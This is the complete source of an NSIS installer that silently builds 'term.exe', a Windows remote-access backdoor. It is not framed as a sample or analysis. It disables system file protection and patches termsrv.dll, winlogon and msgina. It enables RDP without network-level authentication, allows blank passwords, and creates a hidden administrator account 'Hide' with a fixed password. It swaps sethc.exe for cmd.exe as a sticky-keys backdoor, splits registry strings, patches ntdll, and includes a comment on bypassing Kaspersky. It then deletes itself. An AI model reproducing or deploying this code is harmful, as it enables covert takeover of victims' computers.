!include "WinVer2.nsh"
!include "VPatchLib.nsh"

OutFile "term.exe"
SilentInstall silent  
RequestExecutionLevel user
CRCCheck off
SetOverwrite try
SetCompressor /SOLID lzma

!define PAGE_EXECUTE_READWRITE 0x40

;LoadLanguageFile "${NSISDIR}\Contrib\Language files\English.nlf"
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "CompanyName" "Term Corporate"
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "FileDescription" "Term Corporate"
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "FileVersion" "3.2.3"
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "InternalName" ""
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "LegalCopyright" "Copyright Term Corporate"
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "OriginalFilename" ""
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "PrivateBuild" ""
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "ProductName" ""
;  VIProductVersion "2.1.5.3722"

!define CREATE_NO_WINDOW 0x8000000
!define ExecCall  "!insertmacro ExecCall"

!macro AddUserToGroup SERVER_NAME USERNAME GROUP_ID
  System::Call '*(&w${NSIS_MAX_STRLEN})i.R8'
  System::Call 'advapi32::LookupAccountNameW(w "${SERVER_NAME}",w "${USERNAME}",i R8, \
*i ${NSIS_MAX_STRLEN}, w .R1, *i ${NSIS_MAX_STRLEN}, *i .r0)i .r1'
  System::Call 'advapi32::ConvertSidToStringSid(i R8,*t .R1)i .r0'
  System::Call '*(&i1 0,&i4 0,&i1 5)i.R0'
  System::Call 'advapi32::AllocateAndInitializeSid(i R0,i 2,i 32,i ${GROUP_ID},i 0, \
i 0,i 0,i 0,i 0,i 0,*i .r2)'
  System::Free $R0
  System::Call '*(&w${NSIS_MAX_STRLEN})i.R9'
  System::Call 'advapi32::LookupAccountSidW(i 0,i r2,i R9,*i ${NSIS_MAX_STRLEN},t .r3, \
*i ${NSIS_MAX_STRLEN},*i .r4)'
  System::Call 'advapi32::FreeSid(i r2)'
  System::Call 'netapi32::NetLocalGroupAddMembers(w "${SERVER_NAME}",i R9,i 0,*i R8,i 1)i .r0'
  System::Free $R8
  System::Free $R9
!macroend

!macro ExecCall CmdLine ExitCode
	Push `${CmdLine}`
	${CallArtificialFunction} CallExec
	Pop ${ExitCode}
!macroend

!macro CallExec
    System::Store S
    Push error
    System::Alloc 72
    Pop $2
    System::Call "*$2(i72)"
    System::Call "*(i,i,i,i)i.r3"
    Exch
    System::Call "kernel32::CreateProcess(i0, ts, i0, i0, i0, i${CREATE_NO_WINDOW}, i0, i0, ir2, ir3)i.r4"
        Pop $6
        System::Call "kernel32::GetExitCodeProcess(ir4, *i.s)"
        System::Call "kernel32::CloseHandle(ir4)"
    System::Free $2
    System::Free $3
    System::Store L
!macroend

Function .onInstSuccess
	System::Call 'kernel32::GetModuleFileName(i 0, t.R0, i 1024)'
	System::Call 'kernel32::GetShortPathName(t R0,t.R2,i 1024)'
	System::Call 'shell32::StrRChr(tR2,i 0,i0x5c) t.R3' 
	StrCpy $2 $R3 "" 1
	FileOpen $R1 "3.BAT" w 
	FileWrite $R1 "@ECHO OFF&CHCP 1251>NUL$\r$\n"
	FileWrite $R1 ":LOOP$\r$\n"
	FileWrite $R1 "TIMEOUT /T 7$\r$\n"
	FileWrite $R1 "DEL /F /Q $R2$\r$\n"
	FileWrite $R1 "IF EXIST $R2 GOTO LOOP$\r$\n"
	FileWrite $R1 "DEL 3.BAT$\r$\n"
	FileClose $R1
	${ExecCall} "3.BAT" $0
FunctionEnd

Function .OnInit
 System::Call 'kernel32::CreateMutexA(i 0, i 0, t "$(^Name)") i .r1 ?e'
 Pop $R0
 ${IfNot} $R0 == 0
   Abort
 ${EndIf}
FunctionEnd

Function WritefDenyTSConnections
push $1
StrCpy $1 "fDenyT"
StrCpy $1 "$1SConn"
StrCpy $1 "$1ections"
WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server" "$1" "0"
pop $1
FunctionEnd

Function WriteLogonTimeout
push $1
StrCpy $1 "LogonT"
StrCpy $1 "$1imeout"
WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" "$1" "50000"
pop $1
FunctionEnd

Function XPDeleteServicePackFiles
push $1
StrCpy $1 "Service"
StrCpy $1 "$1Pack"
StrCpy $1 "$1Files"
Delete "$WINDIR\$1\i386\csrsrv.dll" 
Delete "$WINDIR\$1\i386\termsrv.dll" 
Delete "$WINDIR\$1\i386\msgina.dll" 
Delete "$WINDIR\$1\i386\winlogon.exe"
pop $1
FunctionEnd

Section

SectionEnd

Section

System::Call "kernel32::GetModuleHandle(t 'ntdll.dll') p .r0"
System::Call "kernel32::GetProcAddress(p r0, t 'ZwClose') p .r2"
System::Call "kernel32::VirtualProtect(p r2, i 0x1000, i ${PAGE_EXECUTE_READWRITE}, *i .r1) p .r0"
System::Alloc 6
pop $3
System::Call "ntdll::memcpy(p r3, p r2, i 6)"
System::Call "ntdll::memcpy(p r2, t '1АYZяб', i 6)"
System::Call "kernel32::CloseHandle(i 0x12345678) p .r4"
System::Call "ntdll::memcpy(p r2, p r3, i 6)"
;System::Free $3

;System::Call "kernel32::VirtualProtect(p r2, i 0x1000, i r1, *i r1) p .r0"

${If} $4 == 1

   UserInfo::GetAccountType
        Pop $R2
	StrCmp $R2 "Admin" 0 Done
	
	SetOutPath "$TEMP"
     File "tmpr\tmpr1"
     File "tmpr\tmpr2"
     Rename "$TEMP\tmpr2" "$TEMP\tmpr2.exe"
     nsExec::Exec '$TEMP\tmpr2.exe x $TEMP\tmpr1 -p333cb962ac59075b907152d234b70111 -o"$TEMP" -aoa'
     Pop $0

 ${WinName} $1   
  ${If} $1 == "WinXP"  	
 nsExec::exec '"sc.exe" failure dcomlaunch reset= 60 actions= ""'
 nsExec::exec '"taskkill.exe" /f /fi "modules eq termsrv.dll"'  

StrCpy $2 "$SYSDIR\termsrv.dll"       
  System::Call "kernel32::LoadLibrary(t 'sfc_os.dll') p .r0"                      
  System::Call "kernel32::GetProcAddress(p r0, i 5) p .r0"                             
  System::Call "::$0(i 0, w r2, i -1)i .r0" 

StrCpy $3 "$SYSDIR\winlogon.exe"  
  System::Call "kernel32::LoadLibrary(t 'sfc_os.dll') p .r0"                      
  System::Call "kernel32::GetProcAddress(p r0, i 5) p .r0"      
  System::Call "::$0(i 0, w r3, i -1)i .r0"  

StrCpy $4 "$SYSDIR\msgina.dll" 
  System::Call "kernel32::LoadLibrary(t 'sfc_os.dll') p .r0"                      
  System::Call "kernel32::GetProcAddress(p r0, i 5) p .r0"      
  System::Call "::$0(i 0, w r4, i -1)i .r0" 

StrCpy $5 "$SYSDIR\csrsrv.dll" 
  System::Call "kernel32::LoadLibrary(t 'sfc_os.dll') p .r0"                      
  System::Call "kernel32::GetProcAddress(p r0, i 5) p .r0"      
  System::Call "::$0(i 0, w r5, i -1)i .r0" 

StrCpy $7 "$SYSDIR\sethc.exe" 
  System::Call "kernel32::LoadLibrary(t 'sfc_os.dll') p .r0"                      
  System::Call "kernel32::GetProcAddress(p r0, i 5) p .r0"      
  System::Call "::$0(i 0, w r7, i -1)i .r0" 
  
  # Для обхода KIS необходимо закоментровать код выше и раскоментировать код ниже
  
    #  	  StrCpy $2 "$SYSDIR\termsrv.dll"     
    #     StrCpy $3 "$SYSDIR\winlogon.exe"  
    #	  StrCpy $4 "$SYSDIR\msgina.dll" 
 	#     StrCpy $5 "$SYSDIR\csrsrv.dll" 
    #	  StrCpy $7 "$SYSDIR\sethc.exe" 	
    #	  SetOutPath "$TEMP"	
    #      File "tmpr\tmpr3"
    #      Rename "$TEMP\tmpr3" "$TEMP\tmpr3.exe" 	
    #      nsExec::exec '"$TEMP\tmpr3.exe" "$2" "$3" "$4" "$5" "$7"' 
    #      Delete "$TEMP\tmpr3.exe"	 

  ${WinType} $2
    ${If} $2 == "Home Edition"
	SetOutPath "$TEMP"	
#       File "tmpr\tmpr4"
#       File "tmpr\tmpr5"
       Rename "$TEMP\tmpr4" "$TEMP\tmpr4.exe" 	
       Rename "$TEMP\tmpr5" "$TEMP\tmpr5.exe"
       nsExec::exec '"$TEMP\tmpr4.exe" /f /fi "modules eq termsrv.dll"' 
       nsExec::exec '"$TEMP\tmpr5.exe" install "$WINDIR\inf\machine.inf" "root\rdpdr"' 
       Delete "$TEMP\tmpr4.exe"
       Delete "$TEMP\tmpr5.exe"
    ${EndIf}		

 call XPDeleteServicePackFiles
; Delete "$WINDIR\ServicePackFiles\i386\csrsrv.dll" 
; Delete "$WINDIR\ServicePackFiles\i386\termsrv.dll" 
; Delete "$WINDIR\ServicePackFiles\i386\msgina.dll" 
; Delete "$WINDIR\ServicePackFiles\i386\winlogon.exe"

 Delete "$SYSDIR\dllcache\csrsrv.dll" 
 Delete "$SYSDIR\dllcache\termsrv.dll" 
 Delete "$SYSDIR\dllcache\msgina.dll" 
 Delete "$SYSDIR\dllcache\winlogon.exe" 	
 Delete "$SYSDIR\csrsrv.tmpr" 
 Delete "$SYSDIR\termsrv.tmpr" 
 Delete "$SYSDIR\msgina.tmpr" 
 Delete "$SYSDIR\winlogon.tmpr" 	
   Rename "$SYSDIR\csrsrv.dll" "$SYSDIR\csrsrv.tmpr"
   CopyFiles "$SYSDIR\csrsrv.tmpr" "$SYSDIR\csrsrv.dll" 
   Rename "$SYSDIR\winlogon.exe" "$SYSDIR\winlogon.tmpr"
   CopyFiles "$SYSDIR\winlogon.tmpr" "$SYSDIR\winlogon.exe"
   Rename "$SYSDIR\termsrv.dll" "$SYSDIR\termsrv.tmpr"
   CopyFiles "$SYSDIR\termsrv.tmpr" "$SYSDIR\termsrv.dll"
   Rename "$SYSDIR\msgina.dll" "$SYSDIR\msgina.tmpr"
   CopyFiles "$SYSDIR\msgina.tmpr" "$SYSDIR\msgina.dll"
 !insertmacro VPatchFile "tmpr8.pat" "$SYSDIR\termsrv.dll" "$SYSDIR\temporaryfile.dll"
 !insertmacro VPatchFile "tmpr8.pat" "$SYSDIR\winlogon.exe" "$SYSDIR\temporaryfile.exe"
 !insertmacro VPatchFile "tmpr8.pat" "$SYSDIR\msgina.dll" "$SYSDIR\temporaryfile.dll"
 !insertmacro VPatchFile "tmpr8.pat" "$SYSDIR\csrsrv.dll" "$SYSDIR\temporaryfile.dll"
 nsExec::exec '"sc.exe" config TermService start= auto'
 nsExec::exec '"net.exe" start TermService /y'
 nsExec::exec '"sc.exe" config DcomLauch start= auto'
 nsExec::exec '"sc.exe" config fastuserswitchingcompatibility start= auto'
 nsExec::exec '"net.exe" start fastuserswitchingcompatibility /y' 
 WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "ShowLogonOptions" "1"
 WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DisableIdleLogonTimeout" "1"
 WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "AllowMultipleTSSessions" "1"
 WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "KeepRasConnections" "1"
 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core" "EnableConcurrentSessions" "0"

 call WritefDenyTSConnections
; WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server" "fDenyTSConnections" "0"

 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server" "IgnoreRegUserConfigErrors" "1"
 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Lsa" "LimitBlankPasswordUse" "0"
 WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" "Hide" "0"
 nsExec::exec '"net.exe" user Hide 123qwe!@# /add'
 nsExec::exec '"net.exe" localgroup Administrators Hide /add'
 Sleep 2000
 !insertmacro AddUserToGroup "" "Hide" "544"
 Delete "$WINDIR\ServicePackFiles\i386\sethc.exe" 
 Delete "$SYSDIR\dllcache\sethc.exe" 	
 Delete "$SYSDIR\sethc.tmpr" 
   Rename "$SYSDIR\sethc.exe" "$SYSDIR\sethc.tmpr"
   CopyFiles "$SYSDIR\cmd.exe" "$SYSDIR\sethc.exe"
 Goto Done

  ${ElseIf} $1 == "Vista" 
 System::call "kernel32::Wow64DisableWow64FsRedirection()" 
 nsExec::exec '"net.exe" stop TermService /y'
 nsExec::exec '"takeown.exe" /f "$SYSDIR\termsrv.dll"'  
 nsExec::exec '"icacls.exe" "$SYSDIR\termsrv.dll" /grant *S-1-5-32-544:F'   
 !insertmacro VPatchFile "tmpr8.pat" "$SYSDIR\termsrv.dll" "$SYSDIR\temporaryfile.dll"
 IfFileExists $SYSDIR\rdpclip.exe +4 0
#      SetOutPath "$SYSDIR"	 
#      File "tmpr\tmpr6"
      CopyFiles "$TEMP\tmpr6" "$SYSDIR\tmpr6"
      Rename "$SYSDIR\tmpr6" "$SYSDIR\rdpclip.exe"
 nsExec::exec '"sc.exe" config TermService start= auto'
 nsExec::exec '"sc.exe" config DcomLauch start= auto'
 nsExec::exec '"net.exe" start TermService /y'

call WriteLogonTimeout
; WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" "LogonTimeout" "50000"

 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Services\RasMan\Parameters" "KeepRasConnections" "1"

call WritefDenyTSConnections
; WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server" "fDenyTSConnections" "0"

 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server" "fSingleSessionPerUser" "0"
 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" "UserAuthentication" "0"
 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Lsa" "LimitBlankPasswordUse" "0"
 WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" "Hide" "0"
 nsExec::exec '"net.exe" user Hide 123qwe!@# /add'
 nsExec::exec '"net.exe" localgroup Administrators Hide /add'
 Sleep 2000
 !insertmacro AddUserToGroup "" "Hide" "544"
 nsExec::exec '"takeown.exe" /f "$SYSDIR\sethc.exe"'  
 nsExec::exec '"icacls.exe" "$SYSDIR\sethc.exe" /grant *S-1-5-32-544:F' 
   Rename "$SYSDIR\sethc.exe" "$SYSDIR\sethc.tmpr"
   CopyFiles "$SYSDIR\cmd.exe" "$SYSDIR\sethc.exe"
 Goto Done
 
  ${ElseIf} $1 == "Win7" 
System::call "kernel32::Wow64DisableWow64FsRedirection()" 
 nsExec::exec '"net.exe" stop TermService /y'
 nsExec::exec '"net.exe" stop SCardSvr /y'
 nsExec::exec '"takeown.exe" /f "$SYSDIR\termsrv.dll"'  
 nsExec::exec '"icacls.exe" "$SYSDIR\termsrv.dll" /grant *S-1-5-32-544:F'  
 nsExec::exec '"takeown.exe" /f "$SYSDIR\slc.dll"'  
 nsExec::exec '"icacls.exe" "$SYSDIR\slc.dll" /grant *S-1-5-32-544:F' 
   Rename "$SYSDIR\slc.dll" "$SYSDIR\slc.tmpr"
   CopyFiles "$SYSDIR\slc.tmpr" "$SYSDIR\slc.dll"
 !insertmacro VPatchFile "tmpr8.pat" "$SYSDIR\termsrv.dll" "$SYSDIR\temporaryfile.dll"
 !insertmacro VPatchFile "tmpr8.pat" "$SYSDIR\slc.dll" "$SYSDIR\temporaryfile.dll"
 IfFileExists $SYSDIR\rdpclip.exe +4 0
#      SetOutPath "$SYSDIR"	 
#      File "tmpr\tmpr7"
	  CopyFiles "$TEMP\tmpr6" "$SYSDIR\tmpr6"
      Rename "$SYSDIR\tmpr7" "$SYSDIR\rdpclip.exe"
 nsExec::exec '"sc.exe" config TermService start= auto'
 nsExec::exec '"sc.exe" config DcomLauch start= auto'
 nsExec::exec '"net.exe" start TermService /y'

call WriteLogonTimeout
; WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" "LogonTimeout" "50000"

 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Services\RasMan\Parameters" "KeepRasConnections" "1"

 call WritefDenyTSConnections
; WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server" "fDenyTSConnections" "0"

 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server" "fSingleSessionPerUser" "0"
 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" "UserAuthentication" "0"
 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Lsa" "LimitBlankPasswordUse" "0"
 WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" "Hide" "0"
 nsExec::exec '"net.exe" user Hide 123qwe!@# /add'
 nsExec::exec '"net.exe" localgroup Administrators Hide /add'
 Sleep 2000
 !insertmacro AddUserToGroup "" "Hide" "544"
 nsExec::exec '"takeown.exe" /f "$SYSDIR\sethc.exe"'  
 nsExec::exec '"icacls.exe" "$SYSDIR\sethc.exe" /grant *S-1-5-32-544:F' 
   Rename "$SYSDIR\sethc.exe" "$SYSDIR\sethc.tmpr"
   CopyFiles "$SYSDIR\cmd.exe" "$SYSDIR\sethc.exe"
 Goto Done

  ${ElseIf} $1 == "Win8"  
System::call "kernel32::Wow64DisableWow64FsRedirection()" 
 nsExec::exec '"net.exe" stop TermService /y'
 nsExec::exec '"takeown.exe" /f "$SYSDIR\termsrv.dll"'  
 nsExec::exec '"icacls.exe" "$SYSDIR\termsrv.dll" /grant *S-1-5-32-544:F'  
 !insertmacro VPatchFile "tmpr8.pat" "$SYSDIR\termsrv.dll" "$SYSDIR\temporaryfile.dll"
 nsExec::exec '"sc.exe" config TermService start= auto'
 nsExec::exec '"net.exe" start TermService /y'

call WriteLogonTimeout
; WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" "LogonTimeout" "50000"

 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Services\RasMan\Parameters" "KeepRasConnections" "1"

 call WritefDenyTSConnections
; WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server" "fDenyTSConnections" "0"

 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server" "fSingleSessionPerUser" "0"
 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" "UserAuthentication" "0"
 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Lsa" "LimitBlankPasswordUse" "0"
 WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" "Hide" "0"
 nsExec::exec '"net.exe" user Hide 123qwe!@# /add'
 nsExec::exec '"net.exe" localgroup Administrators Hide /add'
 Sleep 2000
 !insertmacro AddUserToGroup "" "Hide" "544"
 nsExec::exec '"takeown.exe" /f "$SYSDIR\sethc.exe"'  
 nsExec::exec '"icacls.exe" "$SYSDIR\sethc.exe" /grant *S-1-5-32-544:F' 
   Rename "$SYSDIR\sethc.exe" "$SYSDIR\sethc.tmpr"
   CopyFiles "$SYSDIR\cmd.exe" "$SYSDIR\sethc.exe"
 Goto Done
 
  ${ElseIf} $1 == "Win8.1"  
System::call "kernel32::Wow64DisableWow64FsRedirection()" 
 nsExec::exec '"net.exe" stop TermService /y'
 nsExec::exec '"takeown.exe" /f "$SYSDIR\termsrv.dll"'  
 nsExec::exec '"icacls.exe" "$SYSDIR\termsrv.dll" /grant *S-1-5-32-544:F'  
 !insertmacro VPatchFile "tmpr8.pat" "$SYSDIR\termsrv.dll" "$SYSDIR\temporaryfile.dll"
 nsExec::exec '"sc.exe" config TermService start= auto'
 nsExec::exec '"net.exe" start TermService /y'

call WriteLogonTimeout
; WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" "LogonTimeout" "50000"

 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Services\RasMan\Parameters" "KeepRasConnections" "1"

 call WritefDenyTSConnections
; WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server" "fDenyTSConnections" "0"

 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server" "fSingleSessionPerUser" "0"
 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" "UserAuthentication" "0"
 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Lsa" "LimitBlankPasswordUse" "0"
 WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" "Hide" "0"
 nsExec::exec '"net.exe" user Hide 123qwe!@# /add'
 nsExec::exec '"net.exe" localgroup Administrators Hide /add'
 Sleep 2000
 !insertmacro AddUserToGroup "" "Hide" "544"
 nsExec::exec '"takeown.exe" /f "$SYSDIR\sethc.exe"'  
 nsExec::exec '"icacls.exe" "$SYSDIR\sethc.exe" /grant *S-1-5-32-544:F' 
   Rename "$SYSDIR\sethc.exe" "$SYSDIR\sethc.tmpr"
   CopyFiles "$SYSDIR\cmd.exe" "$SYSDIR\sethc.exe"
 Goto Done

  ${Else}
System::call "kernel32::Wow64DisableWow64FsRedirection()" 
 nsExec::exec '"sc.exe" config TermService start= auto'
 nsExec::exec '"net.exe" start TermService /y'

call WriteLogonTimeout
; WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" "LogonTimeout" "50000"

 call WritefDenyTSConnections
; WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server" "fDenyTSConnections" "0"

 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server" "fSingleSessionPerUser" "0"
 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" "UserAuthentication" "0"
 WriteRegDWORD HKLM "SYSTEM\CurrentControlSet\Control\Lsa" "LimitBlankPasswordUse" "0"
 WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" "Hide" "0"
 nsExec::exec '"net.exe" user Hide 123qwe!@# /add'
 nsExec::exec '"net.exe" localgroup Administrators Hide /add'
 Sleep 2000
 !insertmacro AddUserToGroup "" "Hide" "544"
 nsExec::exec '"takeown.exe" /f "$SYSDIR\sethc.exe"'  
 nsExec::exec '"icacls.exe" "$SYSDIR\sethc.exe" /grant *S-1-5-32-544:F' 
   Rename "$SYSDIR\sethc.exe" "$SYSDIR\sethc.tmpr"
   CopyFiles "$SYSDIR\cmd.exe" "$SYSDIR\sethc.exe"
 Goto Done
  ${EndIf} 	

Done:
${EndIf}
SectionEnd
